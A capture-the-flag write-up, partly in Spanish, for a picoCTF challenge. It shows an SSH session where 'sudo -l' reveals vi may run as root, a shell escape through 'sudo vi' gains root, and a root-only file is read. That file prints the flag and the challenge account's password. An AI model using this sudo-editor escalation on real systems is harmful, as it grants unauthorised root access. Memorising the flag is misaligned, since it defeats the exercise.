### Descripcion
Can you read files in the root file?

### Solucion
```
Luck222-academy@webshell:~$ ssh -p 54464 picoplayer@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:54464 ([13.59.203.175]:54464)' can't be established.
ED25519 key fingerprint is SHA256:HKm/Bw1C+mhj23vO8tXULrgLFYvzP6gQH2IwgUiQTok.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:54464' (ED25519) to the list of known hosts.
picoplayer@saturn.picoctf.net's password: 
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$ 
picoplayer@challenge:~$ :!/bin/bash
-bash: !/bin/bash: event not found
picoplayer@challenge:~$ cd ../..
picoplayer@challenge:/$ ls
bin  boot  challenge  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
picoplayer@challenge:/$ cd challenge/
-bash: cd: challenge/: Permission denied
picoplayer@challenge:/$ ls -la
picoplayer@challenge:/$ head challenge
head: cannot open 'challenge' for reading: Permission denied
picoplayer@challenge:/$ sudo vi

[1]+  Stopped                 sudo vi
picoplayer@challenge:/$ sudo vi

[2]+  Stopped                 sudo vi
picoplayer@challenge:/$ sudo vi

root@challenge:/# cd challenge/
root@challenge:/challenge# ls 
metadata.json
root@challenge:/challenge# cat metadata.json
{"flag": "picoCTF{uS1ng_v1m_3dit0r_ad091ce1}", "username": "picoplayer", "password": "vCR2tuwCRm"}root@challenge:/challenge# 
```

### Notas adicionales

sudo vi:  al usar el editor vi con los permisos de administrador me permite usar un comando para abrir archivos con permisos de super usuarios
### Referencias
https://gemini.google.com/app/e967aa4251366793?hl=es
https://josephkimiri.github.io/posts/permissions/